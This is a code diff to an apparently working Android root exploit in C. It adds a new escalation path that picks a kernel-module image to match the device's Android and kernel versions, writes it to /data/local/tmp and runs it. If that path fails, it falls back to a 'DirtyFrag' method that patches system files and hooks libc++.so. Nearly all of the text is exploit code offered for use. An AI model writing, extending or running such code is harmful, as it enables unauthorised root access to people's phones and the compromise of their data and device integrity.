@@ -17,6 +17,11 @@
 #include <arpa/inet.h>
 #include "aes256.h"
 
+#define DF2_98260 1
+#ifdef DF2_98260
+#include "exp98260.h"
+#endif
+
 #define eos(s) (s + strlen(s))
 
 static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
@@ -537,10 +542,36 @@ static int setup(int argc, char **argv) {
     return 0;
 }
 
+
+#ifdef DF2_98260
+/* Stage the 98260 module to tmp and run the escalate path. */
+static int df2_98260(void) {
+    int andr = 0, major = 0, minor = 0;
+    if (read_device_versions(&andr, &major, &minor)) return -1;
+    const struct KoImage *ko = select_ko_image(andr, major, minor);
+    if (!ko) return -1;
+
+    const char *dir = getenv("TMPDIR") ? getenv("TMPDIR") : "/data/local/tmp";
+    char path[256];
+    snprintf(path, sizeof path, "%s/df2-98260.ko", dir);
+
+    int fd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0644);
+    if (fd < 0) { printf("98260: write ko: %s\n", strerror(errno)); return -1; }
+    if (write(fd, ko->start, (size_t)(ko->end - ko->start)) < 0) { close(fd); return -1; }
+    close(fd);
+
+    return escalate_98260(path);
+}
+#endif
+
 static int exploit(void) {
     printf("\n=== exploit (patching files) ===\n");
 
     int rc = 3;
+#ifdef DF2_98260
+    if (df2_98260() == 0) { rc = 2; goto hooked; }
+    printf("98260: path failed, falling back to DirtyFrag\n");
+#endif
     if (patch_helper()) goto done;
     if (patch_ko()) goto done;
     int hook_rc = patch_hook("/system/lib64/libc++.so",
@@ -558,6 +589,8 @@ static int exploit(void) {
 
     rc = 2;
     usleep(500000);
+
+hooked:
     
     printf("\n=== init  ===\n");
     createOrphanProcess();
